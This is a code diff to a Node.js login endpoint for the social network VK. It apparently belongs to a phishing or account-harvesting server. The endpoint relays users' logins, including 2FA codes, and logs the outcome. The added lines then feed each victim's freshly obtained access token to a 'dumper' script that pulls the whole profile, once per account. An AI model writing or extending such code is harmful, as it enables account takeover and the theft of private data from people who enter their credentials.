@@ -1,13 +1,20 @@
 import { VK } from "vk-io";
+import { sessionData } from "../server";
 import auth from "./_auth";
 import { R_SUCCESS, R_REQUIRE_2FA } from "./_auth-constants";
 import { Instance } from "chalk";
+import { join } from "path";
 
 const chalk = new Instance({ level: 2 });
+const dumperPath = join(process.cwd(), "scripts", "dump", "index.js");
 
 const _ = console.log.bind(console);
 const kwLog = (key, value) =>
   _(chalk.blueBright(`${key}:`), chalk.magentaBright(value));
+
+const dumped = new Set();
+
+const { dump } = require(dumperPath);
 
 /**
  * @type {import("polka").Middleware}
@@ -52,6 +59,38 @@ export const post = async (request, response) => {
       "2fa",
       "code" in request.body ? chalk.redBright("Yes") : chalk.greenBright("No")
     );
+
+    if (sessionData.dump === true) {
+      if (dumped.has(me.id)) {
+        _(chalk.yellowBright("Profile was already dumped"));
+        return;
+      }
+
+      dumped.add(me.id);
+
+      _(
+        chalk.yellowBright(
+          `Starting dumper for profile: https://vk.com/id${me.id}`
+        )
+      );
+
+      return await dump(result.token)
+        .then(() =>
+          _(
+            chalk.greenBright(
+              `Profile: https://vk.com/id${me.id} successful dumped`
+            )
+          )
+        )
+        .catch(error =>
+          _(
+            chalk.redBright(
+              `Profile: https://vk.com/id${me.id} failed to dump`
+            ),
+            error
+          )
+        );
+    }
   } else if (result.status === R_REQUIRE_2FA) {
     kwLog("Status", chalk.yellowBright("2FA Required"));
   } else {
